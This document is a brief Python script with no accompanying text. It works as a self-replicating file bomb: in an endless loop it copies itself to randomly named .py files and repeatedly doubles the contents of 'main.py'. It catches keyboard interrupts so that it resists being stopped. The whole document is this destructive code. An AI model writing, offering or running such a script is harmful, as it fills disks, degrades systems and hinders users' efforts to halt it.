import random
import shutil
import string

count = 2
while True:
    try:
        count += count
        randomgenerate = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(1, count)))
        shutil.copyfile(__file__, randomgenerate + ".py")
        duplication = open("main.py", "r+")
        lines = duplication.readlines()
        duplication.writelines("\n")
        duplication.writelines(lines)
        if count > 10:
            count -= random.randrange(1, count // 2)
    except KeyboardInterrupt:

        count += count
        randomgenerate = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(1, count)))
        shutil.copyfile(__file__, randomgenerate + ".py")
        duplication = open("main.py", "r+")
        lines = duplication.readlines()
        duplication.writelines("\n")
        duplication.writelines(lines)
        if count > 10:
            count -= random.randrange(1, count // 2)